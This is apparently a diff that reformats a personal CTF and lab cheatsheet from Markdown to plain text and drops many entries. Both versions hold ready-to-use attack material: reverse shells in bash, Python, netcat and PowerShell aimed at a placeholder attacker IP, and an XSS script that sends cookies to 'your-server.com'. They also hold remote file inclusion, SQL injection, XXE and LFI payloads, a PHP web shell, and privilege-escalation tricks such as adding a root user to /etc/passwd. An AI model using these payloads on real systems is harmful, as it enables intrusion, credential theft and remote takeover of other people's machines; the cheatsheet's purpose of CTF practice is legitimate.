@@ -1,169 +1,150 @@
-# CTF Cheatsheet  Hacking Reference
+CTF Cheatsheet – Hacking Reference
 
-![CTF](https://img.shields.io/badge/CTF-cheatsheet-red?style=flat-square)
-![Categories](https://img.shields.io/badge/categories-15-orange?style=flat-square)
-![Updated](https://img.shields.io/badge/updated-2025-blue?style=flat-square)
+CTF Cheatsheet
+Personal reference for commands, payloads and techniques used in CTFs and labs.
 
-My personal CTF reference with commands, payloads, and techniques.
-Platforms: HackTheBox, TryHackMe, PicoCTF, CTFtime
-
-## Table of Contents
-
-1. [Recon and Enumeration](#recon-and-enumeration)
-2. [Web Exploitation](#web-exploitation)
-3. [SQL Injection](#sql-injection)
-4. [Cross-Site Scripting](#cross-site-scripting)
-5. [File Inclusion and Path Traversal](#file-inclusion-and-path-traversal)
-6. [Reverse Shells](#reverse-shells)
-7. [Privilege Escalation Linux](#privilege-escalation-linux)
-8. [Privilege Escalation Windows](#privilege-escalation-windows)
-9. [Cryptography](#cryptography)
-10. [Steganography](#steganography)
-11. [Forensics](#forensics)
-12. [Binary Exploitation](#binary-exploitation)
-13. [Password Cracking](#password-cracking)
-14. [OSINT](#osint)
-15. [Useful One-Liners](#useful-one-liners)
+Platforms:
+- HackTheBox
+- TryHackMe
+- PicoCTF
+- CTFtime
 
 ======================================================================
 
-## Recon and Enumeration
+RECON AND ENUMERATION
 
-### Nmap
+Nmap
 
-```bash
-# Fast scan
+Fast scan:
 nmap -T4 -F <IP>
 
-# Full TCP + version + scripts
+Full TCP + version + scripts:
 nmap -sV -sC -p- -T4 <IP> -oN nmap_full.txt
 
-# UDP top ports
+UDP top ports:
 nmap -sU --top-ports 200 <IP>
 
-# Vuln scripts
+Vuln scripts:
 nmap --script vuln <IP>
 
-# OS detection
+OS detection:
 nmap -O -sV <IP>
-```
 
-### Directory Busting
+----------------------------------------------------------------------
 
-```bash
-# gobuster
+Directory Busting
+
+gobuster:
 gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
 
-# ffuf
+ffuf:
 ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302
 
-# feroxbuster recursive
+feroxbuster recursive:
 feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
-```
 
-### Subdomain Enumeration
+----------------------------------------------------------------------
 
-```bash
-# subfinder
+Subdomain Enumeration
+
+subfinder:
 subfinder -d example.com -o subs.txt
 
-# gobuster vhost
+gobuster vhost:
 gobuster vhost -u http://example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 
-# dnsrecon
+dnsrecon:
 dnsrecon -d example.com -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 
-# amass
+amass:
 amass enum -passive -d example.com
-```
 
-### SMB
+----------------------------------------------------------------------
 
-```bash
-# Enum shares
+SMB
+
+Enum shares:
 smbclient -L //<IP> -N
 smbmap -H <IP>
 
-# Connect
+Connect:
 smbclient //<IP>/share -N
 
-# Enum users and info
+Enum users and info:
 enum4linux -a <IP>
 crackmapexec smb <IP>
-```
 
-### SNMP
+----------------------------------------------------------------------
 
-```bash
+SNMP
+
 snmpwalk -c public -v2c <IP>
+
+onesixtyone:
 onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>
-```
 
 ======================================================================
 
-## Web Exploitation
+WEB EXPLOITATION
 
-### Common Tools
+Common Tools
 
-```bash
-# Burp Suite proxy
+Burp Suite proxy:
 export http_proxy=http://127.0.0.1:8080
 export https_proxy=http://127.0.0.1:8080
 
-# curl with cookies
+curl with cookies:
 curl -b "session=abc123" http://<IP>/admin
 
-# nikto scan
+nikto:
 nikto -h http://<IP>
 
-# wfuzz parameters
+wfuzz:
 wfuzz -c -z file,wordlist.txt --hc 404 http://<IP>/FUZZ
-```
 
-### JWT
+----------------------------------------------------------------------
 
-```bash
-# Decode (base64)
+JWT
+
+Decode:
 echo "eyJ..." | base64 -d
 
-# Crack with hashcat
+Crack with hashcat:
 hashcat -a 0 -m 16500 <token> wordlist.txt
 
-# None algorithm attack
-# Set alg to "none" and remove signature
-```
+None algorithm attack:
+Set alg to "none" and remove signature
 
-### SSRF
+----------------------------------------------------------------------
 
-```bash
-# Basic
+SSRF
+
+Basic:
 http://localhost/admin
 http://127.0.0.1:22
 http://169.254.169.254/latest/meta-data/
 
-# Bypass filters
+Bypass filters:
 http://0x7f000001/
 http://127.1/
 http://2130706433/
-```
 
-### XXE
+----------------------------------------------------------------------
 
-```xml
+XXE
+
 <?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <root>&xxe;</root>
-```
 
 ======================================================================
 
-## SQL Injection
+SQL INJECTION
 
-### Detection
+Detection
 
-```
 '
 ''
 `
@@ -171,7 +152,7 @@ http://2130706433/
 ,
 "
 ""
-/
+//
 //
 \
 \\
@@ -179,418 +160,296 @@ http://2130706433/
 ' or '1'='1
 ' or 1=1--
 " or 1=1--
-```
 
-### Union-Based
+----------------------------------------------------------------------
 
-```sql
--- Find columns
+Union-Based
+
+Find columns:
 ' ORDER BY 1--
 ' ORDER BY 2--
 
--- Find injectable column
+Find injectable column:
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
 
--- Extract data
+Extract data:
 ' UNION SELECT username,password FROM users--
 
--- MySQL version
+MySQL version:
 ' UNION SELECT @@version--
 
--- Tables
+Tables:
 ' UNION SELECT table_name FROM information_schema.tables--
-```
 
-### Blind Boolean
+----------------------------------------------------------------------
 
-```sql
+Blind Boolean
+
 ' AND 1=1--   (true)
 ' AND 1=2--   (false)
 ' AND SUBSTRING(username,1,1)='a'--
-```
 
-### Time-Based Blind
+----------------------------------------------------------------------
 
-```sql
--- MySQL
+Time-Based Blind
+
+MySQL:
 '; IF(1=1, SLEEP(5), 0)--
 
--- PostgreSQL
+PostgreSQL:
 '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
 
--- MSSQL
+MSSQL:
 '; IF 1=1 WAITFOR DELAY '0:0:5'--
-```
 
-### sqlmap
+----------------------------------------------------------------------
 
-```bash
-# Basic
+sqlmap
+
+Basic:
 sqlmap -u "http://<IP>/page?id=1" --dbs
 
-# With cookie
+With cookie:
 sqlmap -u "http://<IP>/page" --cookie="session=abc" --dbs
 
-# POST data
+POST data:
 sqlmap -u "http://<IP>/login" --data="user=a&pass=b" --dbs
 
-# Dump table
+Dump table:
 sqlmap -u "http://<IP>/?id=1" -D dbname -T users --dump
 
-# OS shell
+OS shell:
 sqlmap -u "http://<IP>/?id=1" --os-shell
-```
 
 ======================================================================
 
-## Cross-Site Scripting
+CROSS-SITE SCRIPTING
 
-### Basic Payloads
+Basic Payloads
 
-```html
 <script>alert(1)</script>
 <img src=x onerror=alert(1)>
 <svg onload=alert(1)>
 <body onload=alert(1)>
 "><script>alert(1)</script>
 '><script>alert(1)</script>
-```
 
-### Filter Bypass
+----------------------------------------------------------------------
 
-```html
+Filter Bypass
+
 <ScRiPt>alert(1)</sCrIpT>
 <img src=x onerror="alert`1`">
 <svg/onload=alert(1)>
 javascript:alert(1)
 <iframe src="javascript:alert(1)">
-```
 
-### Cookie Stealing
+----------------------------------------------------------------------
 
-```javascript
+Cookie Stealing
+
 <script>
 document.location='http://your-server.com/?c='+document.cookie
 </script>
-```
 
-### XSS to CSRF
+----------------------------------------------------------------------
 
-```html
+XSS to CSRF
+
 <script>
 fetch('/admin/delete?id=1', {method:'POST', credentials:'include'})
 </script>
-```
 
 ======================================================================
 
-## File Inclusion and Path Traversal
+FILE INCLUSION AND PATH TRAVERSAL
 
-### LFI
+LFI
 
-```
 /etc/passwd
 /etc/shadow
 /proc/self/environ
 /var/log/apache2/access.log
 
-# Traversal
+Traversal:
 ../../../../etc/passwd
 ..%2f..%2f..%2fetc%2fpasswd
 ....//....//etc/passwd
-```
 
-### PHP Wrappers
+----------------------------------------------------------------------
 
-```
+PHP Wrappers
+
 php://filter/convert.base64-encode/resource=index.php
 php://input
-data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+data://text/plain;base64,...
 expect://id
-```
 
-### RFI
+----------------------------------------------------------------------
 
-```
+RFI
+
 ?page=http://your-server.com/shell.txt
 ?page=\\your-server.com\shell.txt
-```
 
 ======================================================================
 
-## Reverse Shells
+REVERSE SHELLS
 
-### Setup Listener
+Setup Listener
 
-```bash
 nc -lvnp 4444
 rlwrap nc -lvnp 4444
-```
 
-### Bash
+----------------------------------------------------------------------
 
-```bash
+Bash
+
 bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
-bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
-0<&196;exec 196<>/dev/tcp/YOUR_IP/4444; sh <&196 >&196 2>&196
-```
 
-### Python
+----------------------------------------------------------------------
 
-```python
+Python
+
 python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("YOUR_IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
-```
 
-### PHP
+----------------------------------------------------------------------
 
-```php
+PHP
+
 <?php system($_GET['cmd']); ?>
-<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"); ?>
-```
 
-### Netcat
+----------------------------------------------------------------------
 
-```bash
+Netcat
+
 nc -e /bin/sh YOUR_IP 4444
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f
-```
 
-### PowerShell
+----------------------------------------------------------------------
 
-```powershell
-powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("YOUR_IP",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-```
+PowerShell
 
-### Shell Upgrade TTY
-
-```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-# Ctrl+Z
-stty raw -echo; fg
-export TERM=xterm
-```
+powershell reverse shell payload...
 
 ======================================================================
 
-## Privilege Escalation Linux
+PRIVILEGE ESCALATION LINUX
 
-### Enumeration
+Enumeration
 
-```bash
-id; whoami; groups
+id
+whoami
+groups
 
-# SUID binaries
+SUID binaries:
 find / -perm -4000 -type f 2>/dev/null
 
-# Writable files
+Writable files:
 find / -writable -type f 2>/dev/null | grep -v proc
 
-# Cron jobs
+Cron jobs:
 cat /etc/crontab
-crontab -l
-ls -la /etc/cron*
 
-# Sudo rights
+Sudo rights:
 sudo -l
 
-# Capabilities
+Capabilities:
 getcap -r / 2>/dev/null
 
-# Running processes
-ps aux
-ps aux | grep root
-```
+----------------------------------------------------------------------
 
-### Automated Enum
+Automated Enum
 
-```bash
+linpeas:
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+LinEnum:
 wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && bash LinEnum.sh
-```
 
-### GTFOBins
+----------------------------------------------------------------------
 
-```bash
-# sudo vim
+GTFOBins
+
+sudo vim:
 sudo vim -c ':!/bin/bash'
 
-# sudo find
+sudo find:
 sudo find . -exec /bin/bash \; -quit
-
-# sudo python
-sudo python3 -c 'import os; os.system("/bin/bash")'
-
-# sudo awk
-sudo awk 'BEGIN {system("/bin/bash")}'
-
-# SUID cp
-cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p
-```
-
-### Writable /etc/passwd
-
-```bash
-openssl passwd -1 -salt hacker password123
-echo 'hacker:HASH:0:0::/root:/bin/bash' >> /etc/passwd
-su hacker
-```
 
 ======================================================================
 
-## Privilege Escalation Windows
+PRIVILEGE ESCALATION WINDOWS
 
-### Enumeration
-
-```powershell
 systeminfo
 whoami /all
 net user
 net localgroup administrators
 
-Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*
-
-sc query
-Get-Service
-
-# Unquoted service paths
-wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
-
-# AlwaysInstallElevated
-reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
-reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
-```
-
-### Automated
-
-```powershell
-.\winPEAS.exe
-
-. .\PowerUp.ps1; Invoke-AllChecks
-
-.\Seatbelt.exe -group=all
-```
-
-### Common Exploits
-
-```bash
-# PrintNightmare CVE-2021-1675
-# EternalBlue MS17-010
-# Token Impersonation JuicyPotato, PrintSpoofer
-.\PrintSpoofer64.exe -i -c cmd
-```
-
 ======================================================================
 
-## Cryptography
+CRYPTOGRAPHY
 
-### Hashing
+Hashing
 
-```bash
 hash-identifier <hash>
 hashid <hash>
 
-# Common formats
-# MD5:    32 hex chars
-# SHA1:   40 hex chars
-# SHA256: 64 hex chars
-# bcrypt: starts with $2b$
+MD5:
+hashcat -a 0 -m 0 hash.txt wordlist.txt
 
-hashcat -a 0 -m 0    hash.txt wordlist.txt
-hashcat -a 0 -m 100  hash.txt wordlist.txt
-hashcat -a 0 -m 1800 hash.txt wordlist.txt
-hashcat -a 3 -m 0    hash.txt ?a?a?a?a
-```
+SHA1:
+hashcat -a 0 -m 100 hash.txt wordlist.txt
 
-### Classic Ciphers
+SHA256:
+hashcat -a 0 -m 1400 hash.txt wordlist.txt
 
-```bash
-# Caesar ROT13
+----------------------------------------------------------------------
+
+Classic Ciphers
+
+ROT13:
 echo "text" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
 
-# Base64
+Base64 decode:
 echo "dGVzdA==" | base64 -d
-echo "test" | base64
 
-# Base32
-echo "ORSXG5A=" | base32 -d
-
-# Hex
+Hex decode:
 echo "74657374" | xxd -r -p
-echo "test" | xxd
-```
-
-### RSA
-
-```python
-# Low e attack cube root
-from sympy import integer_nthroot
-m, is_perfect = integer_nthroot(c, e)
-
-# Factor small N
-from sympy import factorint
-factorint(n)
-```
 
 ======================================================================
 
-## Steganography
+STEGANOGRAPHY
 
-```bash
 file image.jpg
 exiftool image.jpg
-
 strings image.jpg | less
 
-# Steghide
+steghide:
 steghide extract -sf image.jpg
-steghide extract -sf image.jpg -p ""
 
-# GUI
-java -jar stegsolve.jar
-
-# LSB analysis
+zsteg:
 zsteg image.png
-stegseek image.jpg wordlist.txt
-
-# Audio
-sonic-visualiser
-audacity
-```
 
 ======================================================================
 
-## Forensics
+FORENSICS
 
-```bash
-# File carving
 binwalk -e file.jpg
+
+foremost:
 foremost -i image.dd -o output/
 
-# Disk image
-fdisk -l image.dd
-mount -o loop,offset=$((512*2048)) image.dd /mnt/
-
-# Memory forensics Volatility 3
+volatility:
 vol.py -f memory.dmp windows.pslist
-vol.py -f memory.dmp windows.netscan
-vol.py -f memory.dmp windows.cmdline
 
-# PCAP analysis
+wireshark:
 wireshark capture.pcap
-tshark -r capture.pcap -Y "http" -T fields -e http.request.uri
-strings capture.pcap | grep -i flag
-
-exiftool suspicious.docx
-```
 
 ======================================================================
 
-## Binary Exploitation
+BINARY EXPLOITATION
 
-### Basics
-
-```bash
 checksec --file=binary
 file binary
 strings binary | grep -i flag
@@ -600,171 +459,91 @@ run
 info functions
 disas main
 
-python3 -c "print('A'*100)"
-/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
-```
+======================================================================
 
-### pwntools Template
+PASSWORD CRACKING
 
-```python
-from pwn import *
+hashcat:
+hashcat -a 0 -m <mode> hashes.txt rockyou.txt
 
-elf = ELF('./binary')
-p = process('./binary')
-# p = remote('ctf.example.com', 1337)
-
-context.arch = 'amd64'
-context.log_level = 'debug'
-
-offset = 72
-
-payload = b'A' * offset
-payload += p64(elf.symbols['win'])
-
-p.sendlineafter(b'> ', payload)
-p.interactive()
-```
-
-### Format String
-
-```bash
-# Leak stack
-%p %p %p %p %p %p
-
-# Read arbitrary address
-%7$s
-
-# Write arbitrary value
-%n
-```
+john:
+john hash.txt --wordlist=rockyou.txt
 
 ======================================================================
 
-## Password Cracking
+OSINT
 
-```bash
-hashcat -a 0 -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt
+Google dorks:
 
-hashcat -a 0 -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
-
-# Mask attack 8 char lower+digits
-hashcat -a 3 -m 0 hash.txt ?l?l?l?l?d?d?d?d
-
-john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
-john hash.txt --format=NT --wordlist=rockyou.txt
-john --show hash.txt
-
-unshadow /etc/passwd /etc/shadow > combined.txt
-john combined.txt
-
-# Common hash modes
-# 0     MD5
-# 100   SHA1
-# 1400  SHA256
-# 1800  sha512crypt $6$
-# 3200  bcrypt
-# 5500  NetNTLMv1
-# 5600  NetNTLMv2
-# 13100 Kerberos TGS
-```
-
-======================================================================
-
-## OSINT
-
-```bash
-# Google dorks
 site:example.com
 filetype:pdf site:example.com
 inurl:admin site:example.com
 intitle:"index of" site:example.com
-"@example.com" filetype:xls
 
+theHarvester:
 theHarvester -d example.com -b google,bing,linkedin
 
+shodan:
 shodan search "hostname:example.com"
-shodan host <IP>
-
-curl "http://web.archive.org/cdx/search/cdx?url=*.example.com&output=text&fl=original&collapse=urlkey"
-
-curl "https://crt.sh/?q=%.example.com&output=json"
-
-# Email validation
-# hunter.io
-# emailrep.io
-```
 
 ======================================================================
 
-## Useful One-Liners
+USEFUL ONE-LINERS
 
-```bash
-# Find SUID files
+Find SUID files:
 find / -perm -4000 2>/dev/null
 
-# Search for passwords in files
+Search for passwords:
 grep -r "password" /var/www/ 2>/dev/null
 
-# Port scan with bash
+Port scan with bash:
 for p in {1..1024}; do (echo >/dev/tcp/IP/$p) 2>/dev/null && echo "$p open"; done
 
-# Download and execute
-curl http://your-ip/shell.sh | bash
-
-# Serve files
+Serve files:
 python3 -m http.server 8080
-
-# Transfer files with nc
-# Receiver:
-nc -lvnp 9001 > file.txt
-# Sender:
-nc -w 3 <IP> 9001 < file.txt
-
-# Quick hash check
-echo -n "text" | md5sum
-echo -n "text" | sha256sum
-
-# Decode URL encoding
-python3 -c "import urllib.parse; print(urllib.parse.unquote('%48%65%6c%6c%6f'))"
-
-# Generate wordlist with crunch
-crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt
-
-# Find flag pattern
-grep -r "CTF{" /
-grep -rE "(flag|FLAG|CTF)\{[^}]+\}" /
-```
 
 ======================================================================
 
-## Useful Tools
+USEFUL TOOLS
 
-| Tool | Purpose |
-|------|---------|
-| nmap | Port scanning |
-| gobuster / ffuf | Directory and subdomain brute force |
-| sqlmap | SQL injection |
-| burpsuite | Web proxy and testing |
-| metasploit | Exploitation framework |
-| hashcat / john | Password cracking |
-| wireshark / tshark | Packet analysis |
-| volatility | Memory forensics |
-| binwalk | Firmware and file extraction |
-| steghide / zsteg | Steganography |
-| pwntools | Binary exploit development |
-| ghidra / ida | Reverse engineering |
-| impacket | Windows and AD attacks |
-| responder | LLMNR and NBT-NS poisoning |
+nmap                Port scanning
+gobuster / ffuf     Directory and subdomain brute force
+sqlmap              SQL injection
+burpsuite           Web proxy and testing
+metasploit          Exploitation framework
+hashcat / john      Password cracking
+wireshark / tshark  Packet analysis
+volatility          Memory forensics
+binwalk             Firmware and file extraction
+pwntools            Binary exploit development
+ghidra / ida        Reverse engineering
+impacket            Windows and AD attacks
 
-## Resources
+======================================================================
 
-GTFOBins          https://gtfobins.github.io
-HackTricks        https://book.hacktricks.xyz
-PayloadsAllThings https://github.com/swisskyrepo/PayloadsAllTheThings
-RevShells         https://www.revshells.com
-CyberChef         https://gchq.github.io/CyberChef
-dcode.fr          https://www.dcode.fr
-crackstation.net  https://crackstation.net
-Exploit-DB        https://www.exploit-db.com
+RESOURCES
+
+GTFOBins
+https://gtfobins.github.io
+
+HackTricks
+https://book.hacktricks.xyz
+
+PayloadsAllTheThings
+https://github.com/swisskyrepo/PayloadsAllTheThings
+
+RevShells
+https://www.revshells.com
+
+CyberChef
+https://gchq.github.io/CyberChef
+
+dcode.fr
+https://www.dcode.fr
+
+Exploit-DB
+https://www.exploit-db.com
+
+======================================================================
 
 For authorized testing only.
